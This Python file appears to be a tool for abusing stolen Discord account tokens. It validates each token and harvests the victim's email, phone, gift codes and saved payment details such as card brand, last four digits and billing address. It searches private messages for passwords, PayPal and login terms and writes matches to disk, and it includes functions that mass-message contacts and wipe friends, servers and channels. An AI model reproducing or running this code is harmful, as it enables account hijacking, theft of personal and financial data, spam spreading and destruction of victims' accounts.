import json
import random
import time

import requests

CEND = '\33[0m'
CRED = '\33[31m'
CGREEN = '\33[32m'


class Api:
    def __init__(self, token, VALIDATE):
        self.token = token
        self.username = "None"
        self.id = "None"
        self.email = "None"
        self.phone = "None"
        self.has_nitro = False
        self.gifts = []
        self.payments = []
        self.game_pass = ""
        self.valid = False

        if VALIDATE:
            self.validate()
        else:
            self.load_json()
            self.valid = True

    def validate(self):
        url = f"https://discord.com/api/v8/users/@me"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            data = r.json()
            self.username = data['username'] + "#" + data['discriminator']
            self.id = data['id']
            self.email = data['email']
            self.phone = data['phone']
            self.has_nitro = self.get_nitro()
            self.gifts = self.get_gifts()
            self.game_pass = self.get_game_pass()
            self.get_payments()

            print(CGREEN + f"{self.username} Valid" + CEND)

            self.valid = True
            return True
        else:
            self.valid = False
            return False

    def get_profile(self):
        url = f"https://discord.com/api/v8/users/{self.id}/profile"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            print(f"Account name: {r.json()['user']['username']}")
            return True
        else:
            print(CRED + f"[Error] in [{self.get_profile.__name__}] {r.status_code}" + CEND)
            return False

    def get_gifts(self):
        url = f"https://discord.com/api/v8/users/@me/entitlements/gifts"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)
        try:
            if dict(r.json())['code'] == 40002:
                return []
        except Exception:
            pass
        return r.json()

    def get_game_pass(self):
        url = f"https://discord.com/api/v8/promotions/xbox-game-pass"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discord.com",
                   }
        r = requests.get(url, headers=headers)

        if r.json()['code'] == 40002:
            return 0

        return r.json()['code']

    def get_nitro(self):
        url = f"https://discord.com/api/v8/users/{self.id}/profile"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)

        try:
            return bool(r.json()['premium_since'])
        except Exception:
            return False

    def get_payments(self):
        payment_types = ["Credit Card", "Paypal"]
        url = "https://discord.com/api/v8/users/@me/billing/payment-sources"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discord.com",
                   "content-type": "application/json",
                   }
        time.sleep(.5)
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            dataa = r.json()

            try:
                for data in dataa:
                    if int(data['type'] == 1):
                        self.payments.append({'type': payment_types[int(data['type']) - 1],
                                              'valid': not data['invalid'],
                                              'brand': data['brand'],
                                              'last 4': data['last_4'],
                                              'expires': str(data['expires_year']) + "y " + str(
                                                  data['expires_month']) + 'm',
                                              'billing name': data['billing_address']['name'],
                                              'country': data['billing_address']['country'],
                                              'state': data['billing_address']['state'],
                                              'city': data['billing_address']['city'],
                                              'zip code': data['billing_address']['postal_code'],
                                              'address': data['billing_address']['line_1'], })
                    else:
                        self.payments.append({'type': payment_types[int(data['type']) - 1],
                                              'valid': not data['invalid'],
                                              'email': data['email'], 'billing name': data['billing_address']['name'],
                                              'country': data['billing_address']['country'],
                                              'state': data['billing_address']['state'],
                                              'city': data['billing_address']['city'],
                                              'zip code': data['billing_address']['postal_code'],
                                              'address': data['billing_address']['line_1'], })
            except Exception as e:
                print(f"Exception payment {e}")
            return True
        else:
            if r.status_code == 403:
                pass # verify account
            else:
                print(CRED + f"[Error] in [{self.get_payments.__name__}] {r.status_code}" + CEND)
            return False

    def get_user_channels(self):
        url = f"https://discordapp.com/api/users/@me/channels"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            return r.json()
        elif r.status_code == 403:
            return {}
        else:
            print(CRED + f"[Error] in [{self.get_user_channels.__name__}] {r.status_code}" + CEND)
            return {}

    def get_guilds(self):
        url = "https://discord.com/api/v8/users/@me/guilds"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            return r.json()
        else:
            print(CRED + f"[Error] in [{self.get_guilds.__name__}] {r.status_code}" + CEND)
            return {}

    def get_friends(self):
        url = "https://discord.com/api/v8/users/@me/relationships"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            return r.json()
        else:
            print(CRED + f"[Error] in [{self.get_friends.__name__}] {r.status_code}" + CEND)
            return {}

    def get_messages(self, terms):
        with open(f"msgs//{self.username}-msgs", "w", encoding="utf-8") as file:
            for index, channel in enumerate(self.get_user_channels()):
                try:
                    url = f"https://discord.com/api/v8/channels/{channel['id']}/messages?limit=100"
                    headers = {"authorization": self.token,
                               "accept": "/",
                               "authority": "discordapp.com",
                               "content-type": "application/json",
                               }
                    r = requests.get(url, headers=headers)
                    if r.status_code == 200:
                        for msg in r.json():
                            if any(word in msg['content'].lower() for word in terms):
                                if msg['author']['username'] in ["MEE6", "Dyno", "AltDentifier"]:
                                    continue
                                file.write(f"By {msg['author']['username'] + '#' + msg['author']['discriminator']} | {msg['channel_id']} Found term.\n{msg['content']}"+"\n\n")
                    else:
                        print(CRED + f"[Error] in [{self.get_messages.__name__}] {r.status_code}" + CEND)
                        return False
                except Exception:
                    pass
        print(f"[Finished] Dumping messages for {self.username}")

    def send_message(self, msg, channel_id):
        url = f"https://discord.com/api/v8/channels/{channel_id}/messages"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-type": "application/json",
                   }
        data = {"content": msg}
        r = requests.post(url, headers=headers, json=data)

    def send_mass_dms(self, message_list):
        total = 0
        for index, channel in enumerate(self.get_user_channels()):
            self.send_message(random.choice(message_list), channel['id'])
            total += 1
            time.sleep(1)
        print(f"{self.username} | Sent {total} dm's")

    def set_typing(self, channel_id):
        url = f"https://discord.com/api/v8/channels/{channel_id}/typing"
        headers = {"authorization": self.token,
                   "accept": "/",
                   "authority": "discordapp.com",
                   "content-length": "0"
                   }
        r = requests.post(url, headers=headers, json={})
        print(f"Sent typing request: {r.status_code}" + CEND)

    def delete_friends(self):
        total = 0
        for index, friend in enumerate(self.get_friends()):
            url = f"https://discord.com/api/v8/users/@me/relationships/{friend['id']}"
            headers = {"authorization": self.token,
                       "accept": "/",
                       "authority": "discordapp.com",
                       "content-type": "application/json",
                       }
            r = requests.delete(url, headers=headers)
            if r.status_code == 200 or r.status_code == 204:
                total += 1
            else:
                print(CRED + f"[Error] in [{self.delete_friends.__name__}] {r.status_code}" + CEND)
            # time.sleep(1)
        print(f"{self.username} | Deleted {total} friends")


    def leave_guilds(self):
        total = 0
        for guild in self.get_guilds():
            if guild['owner']:
                url = f"https://discord.com/api/v8/guilds/{guild['id']}/delete"
                headers = {"authorization": self.token,
                           "accept": "/",
                           "authority": "discord.com",
                           "content-type": "application/json",
                           }
                r = requests.post(url, headers=headers, json={})
                if r.status_code == 204 or r.status_code == 200:
                    total += 1
            else:
                url = f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}"
                headers = {"authorization": self.token,
                           "accept": "/",
                           "authority": "discord.com",
                           "content-type": "application/json",
                           }
                r = requests.delete(url, headers=headers, json={})
        print(f"{self.username} | Deleted {total} guilds")

    def delete_channels(self):
        total = 0
        for index, channel in enumerate(self.get_user_channels()):
            url = f"https://discord.com/api/v8/channels/{channel['id']}"
            headers = {"authorization": self.token,
                       "accept": "/",
                       "authority": "discordapp.com",
                       "content-type": "application/json",
                       }
            r = requests.delete(url, headers=headers)
            if r.status_code == 200:
                total += 1
            # time.sleep(1)
        print(f"{self.username} | Deleted {total} channels")


    def get_friends_with_nitro(self):
        friends = []
        for friend in self.get_friends():
            url = f"https://discord.com/api/v8/users/{friend['id']}/profile"
            headers = {"authorization": self.token,
                       "accept": "/",
                       "authority": "discordapp.com",
                       "content-type": "application/json",
                       }
            r = requests.get(url, headers=headers)

            try:
                if bool(r.json()['premium_since']):
                    friends.append(friend['user']['username']+friend['user']['discriminator'])
            except Exception:
                pass
        return friends

    def search(self):
        terms = ['password', 'pass', 'login', 'paypal', 'email', 'gift', 'nitro', 'account', "@", "gmail"]
        print(f"\nSearching messages in {self.username} with terms: {terms}")
        self.get_messages(terms)


    def load_json(self):
        with open("accounts.json", "r+") as file:
            loaded_accounts = json.load(file)
            self.username = loaded_accounts[self.token]['username']
            self.id = loaded_accounts[self.token]['id']
            self.email = loaded_accounts[self.token]['email']
            self.phone = loaded_accounts[self.token]['phone']
            self.has_nitro = loaded_accounts[self.token]['nitro']
            self.gifts = loaded_accounts[self.token]['gifts']
            self.game_pass = loaded_accounts[self.token]['game_pass']
            self.payments = loaded_accounts[self.token]['payments']

    def dump_json(self):
        json = {"username": self.username, "id": self.id, "email": self.email,
                "phone": self.phone, "nitro": self.has_nitro, "gifts": self.gifts,
                "game_pass": self.game_pass, "payments": self.payments
                }
        return json
